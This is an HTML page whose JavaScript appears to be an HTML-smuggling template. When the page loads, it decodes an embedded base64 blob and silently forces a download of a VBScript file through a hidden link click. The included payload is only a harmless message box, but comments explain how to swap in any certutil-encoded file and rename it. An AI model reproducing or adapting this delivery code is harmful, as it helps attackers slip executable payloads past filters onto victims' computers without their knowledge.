<html>
<body>

<!-- Optional HTML content can go here -->

<script language="JavaScript">
function base64ToArrayBuffer(base64) {
  var binary_string = window.atob(base64);
  var len = binary_string.length;
  var bytes = new Uint8Array( len );
  for (var i = 0; i < len; i++) { bytes[i] = binary_string.charCodeAt(i); }
  return bytes.buffer;
}

function hereDoc(f) {
  return f.toString().
      replace(/^[^\/]+\/\*!?/, '').
      replace(/\*\/[^\/]+$/, '');
}

/* certutil -encode "VBS_FILE.vbs" base64.txt */

var file = hereDoc(function() {/*!
TXNnQm94ICJWQlMgZmlsZSBleGVjdXRlZCBzdWNjZXNzZnVsbHkuIg==
*/});

/* Handle output encoded with certutil */
file = file.replace('-----END CERTIFICATE-----','');
file = file.replace('-----BEGIN CERTIFICATE-----','');
file = file.replace('\r','');
file = file.replace('\n','');
file = file.replace('\t','');
file = file.replace(' ','');

var data = base64ToArrayBuffer(file);
var blob = new Blob([data], {type: 'octet/stream'});

/* Change the downloaded filename below */
var fileName = 'VBS_File.vbs';

if(window.navigator.msSaveOrOpenBlob) window.navigator.msSaveBlob(blob,fileName);
else {
  var a = document.createElement('a');
  document.body.appendChild(a);
  a.style = 'display: none';
  var url = window.URL.createObjectURL(blob);
  a.href = url;
  a.download = fileName;
  a.click();
  window.URL.revokeObjectURL(url);
}
</script>
</body>
</html>